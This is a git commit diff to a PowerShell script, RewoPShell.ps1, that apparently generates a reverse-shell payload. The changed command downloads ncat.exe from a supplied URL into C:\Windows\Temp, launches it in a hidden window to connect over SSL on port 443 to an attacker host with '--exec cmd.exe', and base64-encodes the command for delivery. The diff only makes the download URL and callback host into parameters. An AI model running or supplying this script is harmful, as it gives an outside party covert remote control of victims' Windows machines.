3c4d5e7d0e68803d511924df3c046411ede80729
Aydin Gurbanli <gurbanliaydin@gmail.com>
2020-07-07 16:40:08 +0400

    Update RewoPShell.ps1

--- RewoPShell.ps1
+++ RewoPShell.ps1
@@ -1,10 +1,14 @@
 [CmdletBinding()]
 param(
     [Parameter (Mandatory=$true)]
-    [string] $HostAddress
+    [string] $HostAddress,
+    
+    [Parameter (Mandatory=$true)]
+    [string] $DownloadUrl,
+    
 )
 
-$command = '$url = "http://{0}/ncat.exe";$outpath = "C:\Windows\Temp\ncat.exe";Invoke-WebRequest -Uri $url -OutFile $outpath;$args = @("--ssl","gurbanli.org","443","--exec","cmd.exe");Start-Process -WindowStyle Hidden -FilePath $outpath -ArgumentList $args;' -f $HostAddress
+$command = '$url = "{0}";$outpath = "C:\Windows\Temp\ncat.exe";Invoke-WebRequest -Uri $url -OutFile $outpath;$args = @("--ssl","{1}","443","--exec","cmd.exe");Start-Process -WindowStyle Hidden -FilePath $outpath -ArgumentList $args;' -f $DownloadUrl,$HostAddress
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
